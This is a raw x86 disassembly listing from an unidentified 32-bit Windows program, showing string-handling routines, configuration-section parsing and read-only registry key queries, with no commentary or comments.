  402cfd:	lea    eax,[ebp-0x25c]
  402d03:	push   eax
  402d04:	call   DWORD PTR ds:0x409120
  402d0a:	xor    esi,esi
  402d0c:	test   eax,eax
  402d0e:	jne    0x402d22
  402d10:	lea    eax,[ebp-0x25c]
  402d16:	push   eax
  402d17:	push   esi
  402d18:	call   DWORD PTR ds:0x4090ec
  402d1e:	jmp    0x402d22
  402d20:	xor    esi,esi
  402d22:	lea    eax,[ebp-0x25c]
  402d28:	push   eax
  402d29:	call   DWORD PTR ds:0x4090e8
  402d2f:	test   eax,eax
  402d31:	je     0x402d36
  402d33:	or     ebx,0x10
  402d36:	mov    eax,DWORD PTR [ebp-0x2b14]
  402d3c:	cmp    WORD PTR [eax],si
  402d3f:	je     0x40321b
  402d45:	mov    ecx,DWORD PTR [ebp-0x2b00]
  402d4b:	xor    eax,eax
  402d4d:	mov    WORD PTR [ebp-0x464],ax
  402d54:	test   bl,0x10
  402d57:	jne    0x402d7e
  402d59:	push   0x104
  402d5e:	lea    eax,[ebp-0x464]
  402d64:	push   eax
  402d65:	push   0x7
  402d67:	push   ecx
  402d68:	call   DWORD PTR ds:0x4090e4
  402d6e:	cmp    WORD PTR [ebp-0x464],0x0
  402d76:	jne    0x402d93
  402d78:	mov    ecx,DWORD PTR [ebp-0x2b00]
  402d7e:	push   0x104
  402d83:	lea    eax,[ebp-0x464]
  402d89:	push   eax
  402d8a:	push   0x1
  402d8c:	push   ecx
  402d8d:	call   DWORD PTR ds:0x4090e4
  402d93:	lea    eax,[ebp-0x25c]
  402d99:	push   eax
  402d9a:	call   DWORD PTR ds:0x40904c
  402da0:	lea    esi,[ebp-0x25c]
  402da6:	lea    esi,[esi+eax*2]
  402da9:	lea    eax,[ebp-0x464]
  402daf:	push   eax
  402db0:	lea    eax,[ebp-0x25c]
  402db6:	push   eax
  402db7:	call   DWORD PTR ds:0x409124
  402dbd:	lea    ecx,[esi+0x2]
  402dc0:	mov    edx,0x104
  402dc5:	call   0x403ae9
  402dca:	lea    eax,[ebp-0x25c]
  402dd0:	push   eax
  402dd1:	call   DWORD PTR ds:0x4090e0
  402dd7:	mov    esi,0x30c
  402ddc:	lea    eax,[ebp-0x16ac]
  402de2:	push   esi
  402de3:	push   eax
  402de4:	push   0x2
  402de6:	push   DWORD PTR [ebp-0x2b00]
  402dec:	call   DWORD PTR ds:0x4090e4
  402df2:	test   eax,eax
  402df4:	je     0x403171
  402dfa:	cmp    WORD PTR [ebp-0x16ac],0x0
  402e02:	je     0x403171
  402e08:	lea    eax,[ebp-0x16ac]
  402e0e:	mov    edx,esi
  402e10:	push   eax
  402e11:	lea    ecx,[ebp-0x1094]
  402e17:	call   0x4038fa
  402e1c:	lea    eax,[ebp-0x16ac]
  402e22:	mov    edx,esi
  402e24:	push   eax
  402e25:	lea    ecx,[ebp-0xa7c]
  402e2b:	call   0x4038fa
  402e30:	cmp    WORD PTR [ebp-0xa7c],0x22
  402e38:	push   0x3a
  402e3a:	pop    ecx
  402e3b:	jne    0x402ec4
  402e41:	cmp    WORD PTR [ebp-0xa7a],cx
  402e48:	jne    0x402f08
  402e4e:	cmp    WORD PTR [ebp-0xa78],cx
  402e55:	jne    0x402f08
  402e5b:	lea    eax,[ebp-0xa7c]
  402e61:	push   eax
  402e62:	call   DWORD PTR ds:0x40904c
  402e68:	inc    eax
  402e69:	add    eax,eax
  402e6b:	push   eax
  402e6c:	lea    eax,[ebp-0xa7a]
  402e72:	push   eax
  402e73:	lea    eax,[ebp-0xa7c]
  402e79:	push   eax
  402e7a:	call   DWORD PTR ds:0x4091bc
  402e80:	add    esp,0xc
  402e83:	lea    ecx,[ebp-0xa7c]
  402e89:	call   0x40298e
  402e8e:	mov    esi,eax
  402e90:	xor    eax,eax
  402e92:	cmp    WORD PTR [esi],ax
  402e95:	je     0x402efd
  402e97:	push   0x40118c
  402e9c:	mov    edx,0x30c
  402ea1:	lea    ecx,[ebp-0x1094]
  402ea7:	call   0x4038fa
  402eac:	push   esi
  402ead:	mov    edx,0x30c
  402eb2:	lea    ecx,[ebp-0x1094]
  402eb8:	call   0x40383e
  402ebd:	xor    eax,eax
  402ebf:	mov    WORD PTR [esi],ax
  402ec2:	jmp    0x402f11
  402ec4:	cmp    WORD PTR [ebp-0xa7c],cx
  402ecb:	jne    0x402f08
  402ecd:	cmp    WORD PTR [ebp-0xa7a],cx
  402ed4:	jne    0x402f08
  402ed6:	lea    ecx,[ebp-0xa7c]
  402edc:	call   0x40298e
  402ee1:	mov    esi,eax
  402ee3:	xor    eax,eax
  402ee5:	cmp    WORD PTR [esi],ax
  402ee8:	je     0x402efd
  402eea:	push   esi
  402eeb:	mov    edx,0x30c
  402ef0:	lea    ecx,[ebp-0x1094]
  402ef6:	call   0x4038fa
  402efb:	jmp    0x402ebd
  402efd:	xor    eax,eax
  402eff:	mov    WORD PTR [ebp-0x1094],ax
  402f06:	jmp    0x402f11
  402f08:	xor    eax,eax
  402f0a:	mov    WORD PTR [ebp-0xa7c],ax
  402f11:	cmp    WORD PTR [ebp-0x1094],0x0
  402f19:	je     0x402faf
  402f1f:	xor    eax,eax
  402f21:	mov    WORD PTR [ebp-0x20d4],ax
  402f28:	lea    eax,[ebp-0x1094]
  402f2e:	push   eax
  402f2f:	call   DWORD PTR ds:0x40911c
  402f35:	xor    ecx,ecx
  402f37:	cmp    WORD PTR [eax],cx
  402f3a:	je     0x402f51
  402f3c:	mov    WORD PTR [eax-0x2],cx
  402f40:	mov    edx,0x208
  402f45:	push   eax
  402f46:	lea    ecx,[ebp-0x20d4]
  402f4c:	call   0x4038fa
  402f51:	mov    eax,DWORD PTR [ebp-0x2b04]
  402f57:	lea    edx,[ebp-0x20d4]
  402f5d:	push   edx
  402f5e:	push   eax
  402f5f:	mov    ecx,DWORD PTR [eax]
  402f61:	mov    esi,DWORD PTR [ecx+0x2c]
  402f64:	mov    ecx,esi
  402f66:	call   DWORD PTR ds:0x409210
  402f6c:	call   esi
  402f6e:	lea    eax,[ebp-0x1094]
  402f74:	push   eax
  402f75:	call   DWORD PTR ds:0x409118
  402f7b:	xor    eax,eax
  402f7d:	push   eax
  402f7e:	push   eax
  402f7f:	lea    eax,[ebp-0x1094]
  402f85:	push   eax
  402f86:	call   DWORD PTR ds:0x4090dc
  402f8c:	cmp    WORD PTR [ebp-0x1094],0x0
  402f94:	je     0x402faf
  402f96:	test   bl,0x20
  402f99:	je     0x402fbd
  402f9b:	lea    eax,[ebp-0x1094]
  402fa1:	push   eax
  402fa2:	push   0x3
  402fa4:	call   DWORD PTR ds:0x4090d8
  402faa:	jmp    0x4031f2
  402faf:	cmp    WORD PTR [ebp-0xa7c],0x0
  402fb7:	je     0x4031f2
  402fbd:	lea    eax,[ebp-0xa7c]
  402fc3:	mov    esi,0x30c
  402fc8:	push   eax
  402fc9:	mov    edx,esi
  402fcb:	lea    ecx,[ebp-0x16ac]
  402fd1:	call   0x4038fa
  402fd6:	lea    eax,[ebp-0x1094]
  402fdc:	mov    edx,esi
  402fde:	push   eax
  402fdf:	lea    ecx,[ebp-0x16ac]
  402fe5:	call   0x40383e
  402fea:	mov    eax,DWORD PTR [ebp-0x2b04]
  402ff0:	lea    edx,[ebp-0x16ac]
  402ff6:	push   edx
  402ff7:	push   eax
  402ff8:	mov    ecx,DWORD PTR [eax]
  402ffa:	mov    esi,DWORD PTR [ecx+0x50]
  402ffd:	mov    ecx,esi
  402fff:	call   DWORD PTR ds:0x409210
  403005:	call   esi
  403007:	lea    eax,[ebp-0x16ac]
  40300d:	push   eax
  40300e:	call   DWORD PTR ds:0x409128
  403014:	mov    DWORD PTR [ebp-0x2b08],eax
  40301a:	test   edi,edi
  40301c:	je     0x40302c
  40301e:	lea    eax,[ebp-0x2b08]
  403024:	mov    ecx,edi
  403026:	push   eax
  403027:	call   0x406732
  40302c:	mov    esi,DWORD PTR [ebp-0x2b00]
  403032:	lea    eax,[ebp-0x2afc]
  403038:	push   0x208
  40303d:	push   eax
  40303e:	push   0x3
  403040:	push   esi
  403041:	call   DWORD PTR ds:0x4090e4
  403047:	push   0x8
  403049:	lea    eax,[ebp-0x54]
  40304c:	push   eax
  40304d:	push   0x4
  40304f:	push   esi
  403050:	call   DWORD PTR ds:0x4090e4
  403056:	lea    eax,[ebp-0x54]
  403059:	push   eax
  40305a:	call   DWORD PTR ds:0x409114
  403060:	mov    ecx,DWORD PTR [ebp-0x2b04]
  403066:	push   eax
  403067:	lea    eax,[ebp-0x2afc]
  40306d:	push   eax
  40306e:	mov    esi,DWORD PTR [ecx]
  403070:	push   ecx
  403071:	mov    esi,DWORD PTR [esi+0x44]
  403074:	mov    ecx,esi
  403076:	call   DWORD PTR ds:0x409210
  40307c:	call   esi
  40307e:	push   0x401190
  403083:	mov    edx,0x104
  403088:	lea    ecx,[ebp-0x25c]
  40308e:	call   0x40383e
  403093:	test   eax,eax
  403095:	js     0x4031f2
  40309b:	mov    esi,0x208
  4030a0:	lea    ecx,[ebp-0x1cc4]
  4030a6:	push   0x40119c
  4030ab:	mov    edx,esi
  4030ad:	call   0x4038fa
  4030b2:	push   esi
  4030b3:	lea    eax,[ebp-0x1cc4]
  4030b9:	push   eax
  4030ba:	push   0x6
  4030bc:	push   DWORD PTR [ebp-0x2b00]
  4030c2:	call   DWORD PTR ds:0x4090e4
  4030c8:	mov    eax,DWORD PTR [ebp-0x2b04]
  4030ce:	lea    edx,[ebp-0x1cc4]
  4030d4:	push   edx
  4030d5:	push   eax
  4030d6:	mov    ecx,DWORD PTR [eax]
  4030d8:	mov    esi,DWORD PTR [ecx+0x24]
  4030db:	mov    ecx,esi
  4030dd:	call   DWORD PTR ds:0x409210
  4030e3:	call   esi
  4030e5:	push   0x30c
  4030ea:	lea    eax,[ebp-0x26ec]
  4030f0:	push   eax
  4030f1:	push   0x8
  4030f3:	push   DWORD PTR [ebp-0x2b00]
  4030f9:	call   DWORD PTR ds:0x4090e4
  4030ff:	mov    eax,DWORD PTR [ebp-0x2b04]
  403105:	lea    edx,[ebp-0x26ec]
  40310b:	push   edx
  40310c:	push   eax
  40310d:	mov    ecx,DWORD PTR [eax]
  40310f:	mov    esi,DWORD PTR [ecx+0x1c]
  403112:	mov    ecx,esi
  403114:	call   DWORD PTR ds:0x409210
  40311a:	call   esi
  40311c:	cmp    DWORD PTR [ebp+0xc],0x0
  403120:	je     0x40315c
  403122:	lea    eax,[ebp-0x25c]
  403128:	mov    edx,0x104
  40312d:	push   eax
  40312e:	lea    ecx,[ebp-0x18b4]
  403134:	call   0x4038fa
  403139:	test   eax,eax
  40313b:	js     0x40315c
  40313d:	mov    eax,DWORD PTR [ebp-0x2b18]
  403143:	lea    ecx,[ebp-0x18b4]
  403149:	push   0x1
  40314b:	push   ecx
  40314c:	push   eax
  40314d:	mov    esi,DWORD PTR [eax]
  40314f:	mov    esi,DWORD PTR [esi+0x18]
  403152:	mov    ecx,esi
  403154:	call   DWORD PTR ds:0x409210
  40315a:	call   esi
  40315c:	lea    eax,[ebp-0x25c]
  403162:	and    ebx,0xfffffffe
  403165:	push   eax
  403166:	call   DWORD PTR ds:0x409110
  40316c:	jmp    0x4031f2
  403171:	cmp    DWORD PTR [ebp+0xc],0x0
  403175:	je     0x4031f2
  403177:	lea    eax,[ebp-0x25c]
  40317d:	push   eax
  40317e:	call   DWORD PTR ds:0x40904c
  403184:	mov    esi,0x104
  403189:	lea    ecx,[ebp-0x25c]
  40318f:	sub    esi,eax
  403191:	push   0x401190
  403196:	lea    ecx,[ecx+eax*2]
  403199:	mov    edx,esi
  40319b:	mov    DWORD PTR [ebp-0x2b08],ecx
  4031a1:	call   0x4038fa
  4031a6:	test   eax,eax
  4031a8:	js     0x4031b7
  4031aa:	lea    eax,[ebp-0x25c]
  4031b0:	push   eax
  4031b1:	call   DWORD PTR ds:0x4090d4
  4031b7:	mov    ecx,DWORD PTR [ebp-0x2b08]
  4031bd:	mov    edx,esi
  4031bf:	push   0x4011c8
  4031c4:	call   0x4038fa
  4031c9:	test   eax,eax
  4031cb:	js     0x4031da
  4031cd:	lea    eax,[ebp-0x25c]
  4031d3:	push   eax
  4031d4:	call   DWORD PTR ds:0x4090d4
  4031da:	lea    eax,[ebp-0x25c]
  4031e0:	push   eax
  4031e1:	call   DWORD PTR ds:0x409110
  4031e7:	test   edi,edi
  4031e9:	je     0x4031f2
  4031eb:	mov    ecx,edi
  4031ed:	call   0x405cb7
  4031f2:	push   DWORD PTR [ebp-0x2b00]
  4031f8:	call   DWORD PTR ds:0x40904c
  4031fe:	mov    ecx,DWORD PTR [ebp-0x2b00]
  403204:	xor    esi,esi
  403206:	lea    ecx,[ecx+eax*2]
  403209:	add    ecx,0x2
  40320c:	mov    DWORD PTR [ebp-0x2b00],ecx
  403212:	cmp    WORD PTR [ecx],si
  403215:	jne    0x402d4b
  40321b:	test   edi,edi
  40321d:	je     0x403242
  40321f:	push   esi
  403220:	mov    ecx,edi
  403222:	call   0x405f09
  403227:	mov    ecx,edi
  403229:	mov    DWORD PTR [edi],0x4010fc
  40322f:	call   0x4064aa
  403234:	mov    ecx,edi
  403236:	call   0x405d15
  40323b:	push   edi
  40323c:	call   DWORD PTR ds:0x4090b8
  403242:	cmp    DWORD PTR [ebp+0xc],0x0
  403246:	je     0x403277
  403248:	test   bl,0x1
  40324b:	je     0x403277
  40324d:	cmp    WORD PTR [ebp-0x25c],0x0
  403255:	je     0x403277
  403257:	lea    ecx,[ebp-0x25c]
  40325d:	call   0x402930
  403262:	test   eax,eax
  403264:	je     0x403277
  403266:	lea    eax,[ebp-0x25c]
  40326c:	push   eax
  40326d:	call   DWORD PTR ds:0x409110
  403273:	test   eax,eax
  403275:	jne    0x403257
  403277:	mov    eax,DWORD PTR [ebp-0x2b18]
  40327d:	push   eax
  40327e:	mov    ecx,DWORD PTR [eax]
  403280:	mov    esi,DWORD PTR [ecx+0x8]
  403283:	mov    ecx,esi
  403285:	call   DWORD PTR ds:0x409210
  40328b:	call   esi
  40328d:	mov    eax,DWORD PTR [ebp-0x2b04]
  403293:	push   eax
  403294:	mov    ecx,DWORD PTR [eax]
  403296:	mov    esi,DWORD PTR [ecx+0x8]
  403299:	mov    ecx,esi
  40329b:	call   DWORD PTR ds:0x409210
  4032a1:	call   esi
  4032a3:	push   DWORD PTR [ebp-0x2b14]
  4032a9:	call   DWORD PTR ds:0x409050
  4032af:	push   DWORD PTR [ebp-0x2b1c]
  4032b5:	call   DWORD PTR ds:0x409054
  4032bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4032be:	pop    edi
  4032bf:	pop    esi
  4032c0:	xor    ecx,ebp
  4032c2:	pop    ebx
  4032c3:	call   0x406b70
  4032c8:	mov    esp,ebp
  4032ca:	pop    ebp
  4032cb:	ret    0xc
  4032ce:	int3   
  4032cf:	int3   
  4032d0:	int3   
  4032d1:	int3   
  4032d2:	int3   
  4032d3:	mov    edi,edi
  4032d5:	push   ebp
  4032d6:	mov    ebp,esp
  4032d8:	sub    esp,0x46c
  4032de:	mov    eax,ds:0x408004
  4032e3:	xor    eax,ebp
  4032e5:	mov    DWORD PTR [ebp-0x4],eax
  4032e8:	push   ebx
  4032e9:	push   esi
  4032ea:	mov    ebx,ecx
  4032ec:	mov    esi,edx
  4032ee:	push   ebx
  4032ef:	mov    DWORD PTR [ebp-0x46c],esi
  4032f5:	mov    DWORD PTR [ebp-0x458],ebx
  4032fb:	call   DWORD PTR ds:0x409120
  403301:	test   eax,eax
  403303:	je     0x403456
  403309:	push   edi
  40330a:	push   0xa000
  40330f:	push   0x40
  403311:	call   DWORD PTR ds:0x4090b0
  403317:	mov    edi,eax
  403319:	mov    DWORD PTR [ebp-0x45c],edi
  40331f:	test   edi,edi
  403321:	je     0x403455
  403327:	push   ebx
  403328:	push   0x5000
  40332d:	push   edi
  40332e:	push   esi
  40332f:	call   DWORD PTR ds:0x409078
  403335:	xor    esi,esi
  403337:	cmp    eax,0x4ffe
  40333c:	je     0x403440
  403342:	cmp    DWORD PTR ds:0x408504,esi
  403348:	mov    ebx,edi
  40334a:	mov    eax,ds:0x408500
  40334f:	push   0xc0
  403354:	push   esi
  403355:	mov    DWORD PTR [ebp-0x464],eax
  40335b:	setne  BYTE PTR [ebp-0x460]
  403362:	call   DWORD PTR ds:0x4090bc
  403368:	mov    esi,eax
  40336a:	mov    DWORD PTR [ebp-0x468],esi
  403370:	test   esi,esi
  403372:	je     0x4033a6
  403374:	push   ecx
  403375:	push   0x4015cc
  40337a:	call   0x404cee
  40337f:	push   eax
  403380:	mov    ecx,esi
  403382:	call   0x405e8c
  403387:	push   DWORD PTR [ebp-0x460]
  40338d:	mov    ecx,esi
  40338f:	mov    DWORD PTR [esi],0x4010bc
  403395:	push   DWORD PTR [ebp-0x464]
  40339b:	push   DWORD PTR [ebp-0x46c]
  4033a1:	call   0x405853
  4033a6:	xor    eax,eax
  4033a8:	cmp    WORD PTR [edi],ax
  4033ab:	je     0x403417
  4033ad:	mov    edi,DWORD PTR [ebp-0x458]
  4033b3:	xor    esi,esi
  4033b5:	push   0x20
  4033b7:	lea    eax,[ebp-0x44]
  4033ba:	push   eax
  4033bb:	push   esi
  4033bc:	push   ebx
  4033bd:	call   DWORD PTR ds:0x4090e4
  4033c3:	test   eax,eax
  4033c5:	je     0x4033f7
  4033c7:	push   0x208
  4033cc:	lea    eax,[ebp-0x454]
  4033d2:	push   eax
  4033d3:	push   0x1
  4033d5:	push   ebx
  4033d6:	call   DWORD PTR ds:0x4090e4
  4033dc:	test   eax,eax
  4033de:	je     0x4033f7
  4033e0:	push   DWORD PTR [ebp+0xc]
  4033e3:	lea    eax,[ebp-0x454]
  4033e9:	mov    ecx,edi
  4033eb:	push   DWORD PTR [ebp+0x8]
  4033ee:	lea    edx,[ebp-0x44]
  4033f1:	push   eax
  4033f2:	call   0x4029d6
  4033f7:	push   ebx
  4033f8:	call   DWORD PTR ds:0x40904c
  4033fe:	lea    ebx,[ebx+eax*2]
  403401:	add    ebx,0x2
  403404:	cmp    WORD PTR [ebx],si
  403407:	jne    0x4033b5
  403409:	mov    esi,DWORD PTR [ebp-0x468]
  40340f:	xor    eax,eax
  403411:	mov    edi,DWORD PTR [ebp-0x45c]
  403417:	test   esi,esi
  403419:	je     0x40343e
  40341b:	push   eax
  40341c:	mov    ecx,esi
  40341e:	call   0x405f09
  403423:	mov    ecx,esi
  403425:	mov    DWORD PTR [esi],0x4010bc
  40342b:	call   0x4064aa
  403430:	mov    ecx,esi
  403432:	call   0x405d15
  403437:	push   esi
  403438:	call   DWORD PTR ds:0x4090b8
  40343e:	xor    esi,esi
  403440:	push   edi
  403441:	call   DWORD PTR ds:0x409054
  403447:	push   esi
  403448:	push   esi
  403449:	push   0x1000
  40344e:	push   esi
  40344f:	call   DWORD PTR ds:0x4090cc
  403455:	pop    edi
  403456:	mov    ecx,DWORD PTR [ebp-0x4]
  403459:	pop    esi
  40345a:	xor    ecx,ebp
  40345c:	pop    ebx
  40345d:	call   0x406b70
  403462:	mov    esp,ebp
  403464:	pop    ebp
  403465:	ret    0x8
  403468:	int3   
  403469:	int3   
  40346a:	int3   
  40346b:	int3   
  40346c:	int3   
  40346d:	mov    edi,edi
  40346f:	push   ebp
  403470:	mov    ebp,esp
  403472:	sub    esp,0x20c
  403478:	mov    eax,ds:0x408004
  40347d:	xor    eax,ebp
  40347f:	mov    DWORD PTR [ebp-0x4],eax
  403482:	push   ebx
  403483:	push   esi
  403484:	push   edi
  403485:	mov    edi,0x104
  40348a:	lea    eax,[ebp-0x20c]
  403490:	push   edi
  403491:	push   eax
  403492:	push   0x4011d4
  403497:	mov    esi,ecx
  403499:	call   DWORD PTR ds:0x409058
  40349f:	mov    ebx,0x4011f0
  4034a4:	test   eax,eax
  4034a6:	je     0x4034e3
  4034a8:	push   ebx
  4034a9:	lea    eax,[ebp-0x20c]
  4034af:	push   eax
  4034b0:	call   DWORD PTR ds:0x409124
  4034b6:	test   eax,eax
  4034b8:	je     0x4034e3
  4034ba:	lea    eax,[ebp-0x20c]
  4034c0:	push   eax
  4034c1:	call   DWORD PTR ds:0x409120
  4034c7:	test   eax,eax
  4034c9:	je     0x4034e3
  4034cb:	lea    eax,[ebp-0x20c]
  4034d1:	mov    edx,edi
  4034d3:	push   eax
  4034d4:	mov    ecx,esi
  4034d6:	call   0x4038fa
  4034db:	xor    eax,eax
  4034dd:	inc    eax
  4034de:	jmp    0x403578
  4034e3:	push   edi
  4034e4:	lea    eax,[ebp-0x20c]
  4034ea:	push   eax
  4034eb:	call   DWORD PTR ds:0x40905c
  4034f1:	test   eax,eax
  4034f3:	je     0x40352c
  4034f5:	push   ebx
  4034f6:	lea    eax,[ebp-0x20c]
  4034fc:	push   eax
  4034fd:	call   DWORD PTR ds:0x409124
  403503:	test   eax,eax
  403505:	je     0x40352c
  403507:	lea    eax,[ebp-0x20c]
  40350d:	push   eax
  40350e:	call   DWORD PTR ds:0x409120
  403514:	test   eax,eax
  403516:	je     0x40352c
  403518:	lea    eax,[ebp-0x20c]
  40351e:	mov    edx,edi
  403520:	push   eax
  403521:	mov    ecx,esi
  403523:	call   0x4038fa
  403528:	push   0x2
  40352a:	jmp    0x403573
  40352c:	push   edi
  40352d:	lea    eax,[ebp-0x20c]
  403533:	push   eax
  403534:	call   DWORD PTR ds:0x409060
  40353a:	test   eax,eax
  40353c:	je     0x403576
  40353e:	push   ebx
  40353f:	lea    eax,[ebp-0x20c]
  403545:	push   eax
  403546:	call   DWORD PTR ds:0x409124
  40354c:	test   eax,eax
  40354e:	je     0x403576
  403550:	lea    eax,[ebp-0x20c]
  403556:	push   eax
  403557:	call   DWORD PTR ds:0x409120
  40355d:	test   eax,eax
  40355f:	je     0x403576
  403561:	lea    eax,[ebp-0x20c]
  403567:	mov    edx,edi
  403569:	push   eax
  40356a:	mov    ecx,esi
  40356c:	call   0x4038fa
  403571:	push   0x3
  403573:	pop    eax
  403574:	jmp    0x403578
  403576:	xor    eax,eax
  403578:	mov    ecx,DWORD PTR [ebp-0x4]
  40357b:	pop    edi
  40357c:	pop    esi
  40357d:	xor    ecx,ebp
  40357f:	pop    ebx
  403580:	call   0x406b70
  403585:	mov    esp,ebp
  403587:	pop    ebp
  403588:	ret    
  403589:	int3   
  40358a:	int3   
  40358b:	int3   
  40358c:	int3   
  40358d:	int3   
  40358e:	mov    edi,edi
  403590:	push   ebp
  403591:	mov    ebp,esp
  403593:	push   ecx
  403594:	push   esi
  403595:	push   edi
  403596:	xor    esi,esi
  403598:	lea    eax,[ebp-0x4]
  40359b:	push   esi
  40359c:	push   esi
  40359d:	push   esi
  40359e:	push   esi
  40359f:	push   esi
  4035a0:	push   esi
  4035a1:	push   esi
  4035a2:	push   eax
  4035a3:	push   esi
  4035a4:	mov    edi,ecx
  4035a6:	push   esi
  4035a7:	push   esi
  4035a8:	push   DWORD PTR [edi]
  4035aa:	call   DWORD PTR ds:0x409010
  4035b0:	test   eax,eax
  4035b2:	jne    0x4035bb
  4035b4:	cmp    eax,DWORD PTR [ebp-0x4]
  4035b7:	sbb    esi,esi
  4035b9:	neg    esi
  4035bb:	push   DWORD PTR [edi]
  4035bd:	call   DWORD PTR ds:0x40900c
  4035c3:	pop    edi
  4035c4:	mov    eax,esi
  4035c6:	pop    esi
  4035c7:	mov    esp,ebp
  4035c9:	pop    ebp
  4035ca:	ret    
  4035cb:	int3   
  4035cc:	int3   
  4035cd:	int3   
  4035ce:	int3   
  4035cf:	int3   
  4035d0:	mov    edi,edi
  4035d2:	push   ebp
  4035d3:	mov    ebp,esp
  4035d5:	sub    esp,0x218
  4035db:	mov    eax,ds:0x408004
  4035e0:	xor    eax,ebp
  4035e2:	mov    DWORD PTR [ebp-0x4],eax
  4035e5:	push   ebx
  4035e6:	push   esi
  4035e7:	push   edi
  4035e8:	xor    edi,edi
  4035ea:	mov    ebx,edi
  4035ec:	call   DWORD PTR ds:0x4090d0
  4035f2:	lea    ecx,[ebp-0x20c]
  4035f8:	mov    ds:0x408504,eax
  4035fd:	call   0x40346d
  403602:	cmp    DWORD PTR ds:0x408504,ebx
  403608:	push   0xc0
  40360d:	push   edi
  40360e:	mov    DWORD PTR [ebp-0x210],eax
  403614:	setne  BYTE PTR [ebp-0x218]
  40361b:	mov    ds:0x408500,eax
  403620:	call   DWORD PTR ds:0x4090bc
  403626:	mov    esi,eax
  403628:	test   esi,esi
  40362a:	je     0x403658
  40362c:	push   ecx
  40362d:	push   0x4015b8
  403632:	call   0x404cee
  403637:	push   eax
  403638:	mov    ecx,esi
  40363a:	call   0x405e8c
  40363f:	push   DWORD PTR [ebp-0x218]
  403645:	mov    ecx,esi
  403647:	mov    DWORD PTR [esi],0x4010e4
  40364d:	push   DWORD PTR [ebp-0x210]
  403653:	call   0x4053f3
  403658:	cmp    DWORD PTR ds:0x408500,ebx
  40365e:	je     0x403712
  403664:	push   0x1
  403666:	push   0x1
  403668:	mov    edx,0x401204
  40366d:	lea    ecx,[ebp-0x20c]
  403673:	call   0x4032d3
  403678:	push   0x1
  40367a:	push   edi
  40367b:	mov    edx,0x401224
  403680:	lea    ecx,[ebp-0x20c]
  403686:	call   0x4032d3
  40368b:	push   0x80
  403690:	push   edi
  403691:	mov    edx,0x401240
  403696:	lea    ecx,[ebp-0x20c]
  40369c:	call   0x4032d3
  4036a1:	push   0x100
  4036a6:	push   edi
  4036a7:	mov    edx,0x401260
  4036ac:	lea    ecx,[ebp-0x20c]
  4036b2:	call   0x4032d3
  4036b7:	push   0x400
  4036bc:	push   edi
  4036bd:	mov    edx,0x401280
  4036c2:	lea    ecx,[ebp-0x20c]
  4036c8:	call   0x4032d3
  4036cd:	push   0x200
  4036d2:	push   edi
  4036d3:	mov    edx,0x40129c
  4036d8:	lea    ecx,[ebp-0x20c]
  4036de:	call   0x4032d3
  4036e3:	lea    eax,[ebp-0x20c]
  4036e9:	push   eax
  4036ea:	call   DWORD PTR ds:0x4090d4
  4036f0:	test   eax,eax
  4036f2:	jne    0x403712
  4036f4:	call   DWORD PTR ds:0x4090c0
  4036fa:	mov    ebx,eax
  4036fc:	test   ebx,ebx
  4036fe:	jle    0x40370b
  403700:	movzx  ebx,bx
  403703:	or     ebx,0x80070000
  403709:	test   ebx,ebx
  40370b:	js     0x403712
  40370d:	mov    ebx,0x80004005
  403712:	lea    eax,[ebp-0x214]
  403718:	push   eax
  403719:	push   0x20019
  40371e:	push   edi
  40371f:	push   0x4012c0
  403724:	push   0x80000002
  403729:	call   DWORD PTR ds:0x409000
  40372f:	test   eax,eax
  403731:	jne    0x403801
  403737:	lea    eax,[ebp-0x210]
  40373d:	push   eax
  40373e:	push   0x20019
  403743:	push   edi
  403744:	push   0x401314
  403749:	push   DWORD PTR [ebp-0x214]
  40374f:	call   DWORD PTR ds:0x409000
  403755:	test   eax,eax
  403757:	jne    0x403766
  403759:	lea    ecx,[ebp-0x210]
  40375f:	call   0x40358e
  403764:	jmp    0x403768
  403766:	mov    eax,edi
  403768:	test   eax,eax
  40376a:	je     0x403777
  40376c:	test   esi,esi
  40376e:	je     0x403777
  403770:	mov    ecx,esi
  403772:	call   0x405591
  403777:	lea    eax,[ebp-0x210]
  40377d:	push   eax
  40377e:	push   0x20019
  403783:	push   edi
  403784:	push   0x40133c
  403789:	push   DWORD PTR [ebp-0x214]
  40378f:	call   DWORD PTR ds:0x409000
  403795:	test   eax,eax
  403797:	jne    0x4037a6
  403799:	lea    ecx,[ebp-0x210]
  40379f:	call   0x40358e
  4037a4:	jmp    0x4037a8
  4037a6:	mov    eax,edi
  4037a8:	test   eax,eax
  4037aa:	je     0x4037b7
  4037ac:	test   esi,esi
  4037ae:	je     0x4037b7
  4037b0:	mov    ecx,esi
  4037b2:	call   0x4054d5
  4037b7:	lea    eax,[ebp-0x210]
  4037bd:	push   eax
  4037be:	push   0x20019
  4037c3:	push   edi
  4037c4:	push   0x401354
  4037c9:	push   DWORD PTR [ebp-0x214]
  4037cf:	call   DWORD PTR ds:0x409000
  4037d5:	test   eax,eax
  4037d7:	jne    0x4037e6
  4037d9:	lea    ecx,[ebp-0x210]
  4037df:	call   0x40358e
  4037e4:	mov    edi,eax
  4037e6:	test   edi,edi
  4037e8:	je     0x4037f5
  4037ea:	test   esi,esi
  4037ec:	je     0x4037f5
  4037ee:	mov    ecx,esi
  4037f0:	call   0x405533
  4037f5:	push   DWORD PTR [ebp-0x214]
  4037fb:	call   DWORD PTR ds:0x40900c
  403801:	test   esi,esi
  403803:	je     0x403828
  403805:	push   ebx
  403806:	mov    ecx,esi
  403808:	call   0x405f09
  40380d:	mov    ecx,esi
  40380f:	mov    DWORD PTR [esi],0x4010e4
  403815:	call   0x4064aa
  40381a:	mov    ecx,esi
  40381c:	call   0x405d15
  403821:	push   esi
  403822:	call   DWORD PTR ds:0x4090b8
  403828:	mov    ecx,DWORD PTR [ebp-0x4]
  40382b:	pop    edi
  40382c:	pop    esi
  40382d:	xor    ecx,ebp
  40382f:	pop    ebx
  403830:	call   0x406b70
  403835:	mov    esp,ebp
  403837:	pop    ebp
  403838:	ret    
  403839:	int3   
  40383a:	int3   
  40383b:	int3   
  40383c:	int3   
  40383d:	int3   
  40383e:	mov    edi,edi
  403840:	push   ebp
  403841:	mov    ebp,esp
  403843:	push   ebx
  403844:	xor    eax,eax
  403846:	mov    ebx,ecx
  403848:	push   esi
  403849:	mov    esi,eax
  40384b:	test   edx,edx
  40384d:	je     0x403857
  40384f:	cmp    edx,0x7fffffff
  403855:	jbe    0x40385c
  403857:	mov    esi,0x80070057
  40385c:	test   esi,esi
  40385e:	js     0x40389d
  403860:	mov    ecx,edx
  403862:	mov    esi,eax
  403864:	push   edi
  403865:	mov    edi,ebx
  403867:	test   edx,edx
  403869:	je     0x403882
